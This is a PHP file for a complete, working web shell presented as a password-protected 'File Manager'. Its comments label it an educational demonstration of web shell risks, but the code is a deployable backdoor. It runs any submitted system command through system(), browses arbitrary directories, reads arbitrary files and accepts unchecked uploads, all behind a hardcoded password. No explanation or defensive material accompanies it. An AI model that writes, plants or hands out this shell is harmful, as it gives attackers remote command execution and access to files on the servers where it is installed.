<?php
session_start(); // Add session_start at the beginning

// This is a demonstration file to show web shell risks
// DO NOT use in production environments - for educational purposes only

// Simple authentication
$password = "demo123"; // In real attacks, this would be more obscure
if (!isset($_SESSION['auth'])) {
    if (isset($_POST['password']) && $_POST['password'] === $password) {
        $_SESSION['auth'] = true;
    } else {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login</title>
            <style>
                body { font-family: monospace; background: #1a1a1a; color: #33ff33; padding: 20px; }
                .login-container { 
                    max-width: 300px; 
                    margin: 100px auto; 
                    padding: 20px;
                    background: #000;
                    border: 1px solid #33ff33;
                }
                input { 
                    background: #000; 
                    color: #33ff33; 
                    border: 1px solid #33ff33; 
                    padding: 5px;
                    width: 100%;
                    margin-bottom: 10px;
                }
                input[type="submit"] { 
                    background: #33ff33; 
                    color: #000; 
                    cursor: pointer;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <h2>File Manager Login</h2>
                <form method="POST">
                    <input type="password" name="password" placeholder="Enter password">
                    <input type="submit" value="Login">
                </form>
            </div>
        </body>
        </html>
        <?php
        die();
    }
}

// Functions for file operations
function listFiles($path) {
    return array_diff(scandir($path), array('.', '..'));
}

function readFileContents($file) {
    return file_get_contents($file);
}

function getUploadedFile() {
    if(isset($_FILES['uploadfile'])) {
        $file = $_FILES['uploadfile'];
        move_uploaded_file($file['tmp_name'], $file['name']);
        return "File uploaded: " . $file['name'];
    }
    return null;
}

// Interface
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager</title>
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #33ff33; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; }
        pre { background: #000; padding: 10px; }
        input, select { background: #000; color: #33ff33; border: 1px solid #33ff33; padding: 5px; }
        button { background: #33ff33; color: #000; border: none; padding: 5px 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>File Manager Interface</h2>
        
        <!-- Command execution -->
        <form method="POST">
            <input type="text" name="cmd" placeholder="Enter system command" style="width: 400px;">
            <button type="submit">Execute</button>
        </form>

        <?php
        if(isset($_POST['cmd'])) {
            echo "<pre>";
            system($_POST['cmd']);
            echo "</pre>";
        }
        ?>

        <!-- File browser -->
        <h3>File Browser</h3>
        <form method="POST">
            <input type="text" name="path" placeholder="Enter path" value="<?php echo getcwd(); ?>" style="width: 400px;">
            <button type="submit">List Files</button>
        </form>

        <?php
        if(isset($_POST['path'])) {
            echo "<pre>";
            print_r(listFiles($_POST['path']));
            echo "</pre>";
        }
        ?>

        <!-- File upload -->
        <h3>Upload File</h3>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="uploadfile">
            <button type="submit">Upload</button>
        </form>

        <?php
        $uploadResult = getUploadedFile();
        if($uploadResult) {
            echo "<pre>$uploadResult</pre>";
        }
        ?>

        <!-- File reader -->
        <h3>Read File</h3>
        <form method="POST">
            <input type="text" name="readfile" placeholder="Enter file path" style="width: 400px;">
            <button type="submit">Read</button>
        </form>

        <?php
        if(isset($_POST['readfile'])) {
            echo "<pre>";
            echo htmlspecialchars(readFileContents($_POST['readfile']));
            echo "</pre>";
        }
        ?>
    </div>
</body>
</html>
